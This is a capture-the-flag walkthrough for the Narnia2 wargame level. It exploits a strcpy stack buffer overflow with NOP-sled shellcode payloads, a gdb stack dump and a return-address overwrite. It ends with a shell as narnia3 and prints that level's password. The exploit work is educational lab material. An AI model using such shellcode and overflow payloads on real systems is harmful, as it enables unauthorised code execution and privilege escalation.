# Narnia2 - Walkthrough

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

As it seems, we should put a shell code inside the buffer, 
surrounded by nops, and override the return address to the buffer itself.


AFter push:

(gdb) x $esp
0xffffd648:     0x002c307d

One of two options:
./narnia2 `python -c 'print "\x90"*20+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + 85*"\x90" +"\xb8\xd5\xff\xff"'`

./narnia2 `python -c 'print "\x90"*20+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" + 55*"\x90" +"\xb8\xd5\xff\xff"'`

Well - It's not working. Take a minute to think why.

Here's your answer - the stack is emptied after the program!
We shall go to the parameters section. not the local variables!



So let's change it:
```
narnia2@narnia:/narnia$ gdb --args ./narnia2 `python -c 'print "\x90"*75+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff
\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" +"\x18\xd8\xff\xff"'`
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804844e
(gdb) r
Starting program: /narnia/narnia2 \^1ɱ\!lukYSgi.qSkii0cbti0cjoSRT΁

Breakpoint 1, 0x0804844e in main ()
(gdb) x/200x $esp
0xffffd638:     0x00000000      0xf7e2a286      0x00000002      0xffffd6d4
0xffffd648:     0xffffd6e0      0x00000000      0x00000000      0x00000000
0xffffd658:     0xf7fc5000      0xf7ffdc0c      0xf7ffd000      0x00000000
0xffffd668:     0x00000002      0xf7fc5000      0x00000000      0x8d9aacd0
0xffffd678:     0xb772a0c0      0x00000000      0x00000000      0x00000000
0xffffd688:     0x00000002      0x08048350      0x00000000      0xf7fee710
0xffffd698:     0xf7e2a199      0xf7ffd000      0x00000002      0x08048350
0xffffd6a8:     0x00000000      0x08048371      0x0804844b      0x00000002
0xffffd6b8:     0xffffd6d4      0x080484a0      0x08048500      0xf7fe9070
0xffffd6c8:     0xffffd6cc      0xf7ffd920      0x00000002      0xffffd804
0xffffd6d8:     0xffffd814      0x00000000      0xffffd89d      0xffffd8b0
0xffffd6e8:     0xffffde6c      0xffffdea1      0xffffdeb0      0xffffdec1
0xffffd6f8:     0xffffded6      0xffffdee3      0xffffdeef      0xffffdef8
0xffffd708:     0xffffdf0b      0xffffdf2d      0xffffdf40      0xffffdf4c
0xffffd718:     0xffffdf63      0xffffdf73      0xffffdf87      0xffffdf92
0xffffd728:     0xffffdf9a      0xffffdfaa      0x00000000      0x00000020
0xffffd738:     0xf7fd7c90      0x00000021      0xf7fd7000      0x00000010
0xffffd748:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xffffd758:     0x00000064      0x00000003      0x08048034      0x00000004
0xffffd768:     0x00000020      0x00000005      0x00000008      0x00000007
0xffffd778:     0xf7fd9000      0x00000008      0x00000000      0x00000009
0xffffd788:     0x08048350      0x0000000b      0x000036b2      0x0000000c
0xffffd798:     0x000036b2      0x0000000d      0x000036b2      0x0000000e
0xffffd7a8:     0x000036b2      0x00000017      0x00000001      0x00000019
0xffffd7b8:     0xffffd7eb      0x0000001a      0x00000000      0x0000001f
0xffffd7c8:     0xffffdfe8      0x0000000f      0xffffd7fb      0x00000000
0xffffd7d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd7e8:     0xee000000      0x16657f9b      0x8397b91b      0x348619f0
0xffffd7f8:     0x69f01504      0x00363836      0x00000000      0x72616e2f
0xffffd808:     0x2f61696e      0x6e72616e      0x00326169      0x90909090
0xffffd818:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd828:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd838:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd848:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd858:     0x90909090      0xeb909090      0xc9315e11      0x6c8021b1
0xffffd868:     0x8001ff0e      0xf67501e9      0xeae805eb      0x6bffffff
0xffffd878:     0x539a590c      0x712e6967      0x6b53e28a      0x63306969
0xffffd888:     0x30697462      0x8a6f6a63      0x545253e4      0x81cee28a
0xffffd898:     0xffffd818      0x5f434c00      0x3d4c4c41      0x555f6e65
0xffffd8a8:     0x54552e53      0x00382d46      0x435f534c      0x524f4c4f
---Type <return> to continue, or q <return> to quit---
0xffffd8b8:     0x73723d53      0x643a303d      0x31303d69      0x3a34333b
0xffffd8c8:     0x303d6e6c      0x36333b31      0x3d686d3a      0x703a3030
0xffffd8d8:     0x30343d69      0x3a33333b      0x303d6f73      0x35333b31
0xffffd8e8:     0x3d6f643a      0x333b3130      0x64623a35      0x3b30343d
0xffffd8f8:     0x303b3333      0x64633a31      0x3b30343d      0x303b3333
0xffffd908:     0x726f3a31      0x3b30343d      0x303b3133      0x696d3a31
0xffffd918:     0x3a30303d      0x333d7573      0x31343b37      0x3d67733a
0xffffd928:     0x343b3033      0x61633a33      0x3b30333d      0x743a3134
0xffffd938:     0x30333d77      0x3a32343b      0x333d776f      0x32343b34
0xffffd948:     0x3d74733a      0x343b3733      0x78653a34      0x3b31303d
```


Let's jump somewhere safe, like we wrote above:

```
narnia2@narnia:/narnia$ ./narnia2 `python -c 'print "\x90"*75+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0
c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" +"\x38\xd8\xff\xff"'`
bash-4.4$ whoami
narnia3
bash-4.4$ cat /etc/narnia_pass/narnia3
vaequeezee
bash-4.4$
```

yeeessssssssss!!!!!!!!!!
:):))